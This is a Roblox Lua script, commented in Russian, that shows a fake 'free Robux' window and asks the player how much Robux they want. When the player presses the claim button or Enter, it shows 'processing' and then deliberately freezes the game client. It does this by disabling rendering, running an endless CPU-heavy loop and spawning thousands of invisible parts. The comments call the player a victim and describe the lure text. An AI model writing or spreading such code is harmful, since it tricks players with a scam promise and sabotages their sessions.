-- ГУИ "БЕСПЛАТНЫЕ РОБУКСЫ" + ЗАВИСАНИЕ (SWILL)
local player = game.Players.LocalPlayer

-- СОЗДАЁМ ГУИ
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 500, 0, 300)
frame.Position = UDim2.new(0.5, -250, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

-- ЗАГОЛОВОК
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🎁 БЕСПЛАТНЫЕ РОБУКСЫ"
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = frame

-- ТЕКСТ-ЗАМАНКА
local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -40, 0, 80)
desc.Position = UDim2.new(0, 20, 0, 70)
desc.BackgroundTransparency = 1
desc.Text = "Введите количество Robux,\nкоторое хотите получить"
desc.TextColor3 = Color3.fromRGB(200, 200, 200)
desc.TextScaled = true
desc.TextWrapped = true
desc.Parent = frame

-- ПОЛЕ ВВОДА (для вида, можно ничего не писать)
local input = Instance.new("TextBox")
input.Size = UDim2.new(0, 200, 0, 40)
input.Position = UDim2.new(0.5, -100, 0.5, 20)
input.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.PlaceholderText = "1000"
input.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
input.Text = ""
input.Font = Enum.Font.SourceSans
input.Parent = frame

-- КНОПКА "ЗАБРАТЬ" (ПРИ НАЖАТИИ — ЗАВИСАНИЕ)
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 200, 0, 50)
button.Position = UDim2.new(0.5, -100, 0.8, 0)
button.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
button.Text = "🔹 ЗАБРАТЬ ROBUX"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.Font = Enum.Font.SourceSansBold
button.Parent = frame

-- КНОПКА ЗАКРЫТЬ (крестик)
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 40, 0, 40)
close.Position = UDim2.new(1, -45, 0, 5)
close.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
close.Text = "✕"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.TextScaled = true
close.Parent = frame
close.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- ФУНКЦИЯ ЗАВИСАНИЯ (ФРИЗА) ИГРЫ
local function freezeGame()
    -- ОТКЛЮЧАЕМ РЕНДЕРИНГ (картинка застывает)
    pcall(function()
        game:GetService("RunService"):Set3dRenderingEnabled(false)
    end)

    -- БЕСКОНЕЧНЫЙ ЦИКЛ (НАГРУЖАЕТ ПРОЦЕССОР)
    spawn(function()
        while true do
            local a = {}
            for i = 1, 100000 do
                a[i] = i * i * i * i
            end
            task.wait()
        end
    end)

    -- СОЗДАЁМ ТЫСЯЧИ ОБЪЕКТОВ (ПАМЯТЬ)
    spawn(function()
        for i = 1, 5000 do
            local p = Instance.new("Part")
            p.Parent = workspace
            p.Size = Vector3.new(100, 100, 100)
            p.Anchored = true
            p.CanCollide = false
            p.Transparency = 1
            task.wait()
        end
    end)

    -- ДОПОЛНИТЕЛЬНО: МЕНЯЕМ НАСТРОЙКИ ГРАФИКИ (ДЛЯ ТОРМОЗОВ)
    pcall(function()
        local graphics = game:GetService("GraphicsService")
        graphics:SetGraphicsMode(1)
    end)
end

-- ПРИ НАЖАТИИ КНОПКИ — ФРИЗ
button.MouseButton1Click:Connect(function()
    -- МЕНЯЕМ ТЕКСТ (ЧТОБЫ ЖЕРТВА ПОДУМАЛА, ЧТО ОБРАБОТКА ИДЁТ)
    button.Text = "⏳ ОБРАБОТКА..."
    button.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    task.wait(0.5) -- небольшая пауза для эффекта

    freezeGame()
end)

-- ПРИ НАЖАТИИ ENTER В ПОЛЕ ВВОДА — ТОЖЕ ФРИЗ
input.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        button.Text = "⏳ ОБРАБОТКА..."
        button.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
        task.wait(0.5)
        freezeGame()
    end
end)

print("[ГУИ] Окно с робуксами открыто. При нажатии 'Забрать' — игра зависнет.")
